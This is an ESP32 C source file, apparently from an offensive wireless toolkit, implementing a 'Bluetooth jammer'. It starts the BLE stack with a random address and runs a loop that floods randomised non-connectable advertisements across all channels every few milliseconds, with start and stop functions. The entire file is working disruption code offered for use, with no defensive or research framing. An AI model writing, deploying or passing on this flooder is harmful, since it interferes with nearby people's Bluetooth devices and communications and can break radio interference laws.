#include "attack_bluetooth_jammer.h"
#define LOG_LOCAL_LEVEL ESP_LOG_VERBOSE
#include "esp_log.h"
#include "esp_bt.h"
#include "esp_bt_main.h"
#include "esp_gap_ble_api.h"
#include "esp_bt_device.h"
#include "esp_random.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include <string.h>

static const char *TAG = "bt_jammer";
static bool bt_running = false;
static TaskHandle_t bt_task = NULL;

static void bt_jammer_func(void *pv) {
    ESP_LOGI(TAG, "BT jammer task started");

    esp_ble_adv_params_t adv_params = {
        .adv_int_min       = 0x20,
        .adv_int_max       = 0x40,
        .adv_type          = ADV_TYPE_NONCONN_IND,
        .channel_map       = ADV_CHNL_ALL,
        .own_addr_type     = BLE_ADDR_TYPE_RANDOM,
        .adv_filter_policy = ADV_FILTER_ALLOW_SCAN_ANY_CON_ANY,
    };

    uint8_t adv_data[31];

    while (bt_running) {
        memset(adv_data, 0, 31);
        adv_data[0] = 0x02; adv_data[1] = 0x01; adv_data[2] = 0x06;
        adv_data[3] = 0x03; adv_data[4] = 0x02;
        adv_data[5] = esp_random() & 0xFF;
        adv_data[6] = esp_random() & 0xFF;
        for (int i = 7; i < 31; i++) adv_data[i] = esp_random() & 0xFF;

        esp_ble_gap_config_adv_data_raw(adv_data, 31);
        esp_ble_gap_start_advertising(&adv_params);
        vTaskDelay(pdMS_TO_TICKS(15));
        esp_ble_gap_stop_advertising();
        vTaskDelay(pdMS_TO_TICKS(5));
    }

    vTaskDelete(NULL);
}

void bt_jammer_start(void) {
    if (bt_running) return;

    ESP_ERROR_CHECK(esp_bt_controller_mem_release(ESP_BT_MODE_CLASSIC_BT));
    esp_bt_controller_config_t bt_cfg = BT_CONTROLLER_INIT_CONFIG_DEFAULT();
    ESP_ERROR_CHECK(esp_bt_controller_init(&bt_cfg));
    ESP_ERROR_CHECK(esp_bt_controller_enable(ESP_BT_MODE_BLE));
    ESP_ERROR_CHECK(esp_bluedroid_init());
    ESP_ERROR_CHECK(esp_bluedroid_enable());

    uint8_t rand_addr[6];
    for (int i = 0; i < 6; i++) rand_addr[i] = esp_random() & 0xFF;
    rand_addr[0] = (rand_addr[0] & 0xFE) | 0x02;
    esp_ble_gap_set_rand_addr(rand_addr);

    bt_running = true;
    xTaskCreate(bt_jammer_func, "bt_jammer", 4096, NULL, 5, &bt_task);
    ESP_LOGI(TAG, "BT Jammer ACTIVE - flooding BLE advertisements");
}

void bt_jammer_stop(void) {
    if (!bt_running) return;
    bt_running = false;
    if (bt_task) { vTaskDelay(pdMS_TO_TICKS(100)); bt_task = NULL; }
    esp_ble_gap_stop_advertising();
    esp_bluedroid_disable();
    esp_bluedroid_deinit();
    esp_bt_controller_disable();
    esp_bt_controller_deinit();
    ESP_LOGI(TAG, "BT Jammer stopped");
}

bool bt_jammer_is_running(void) { return bt_running; }
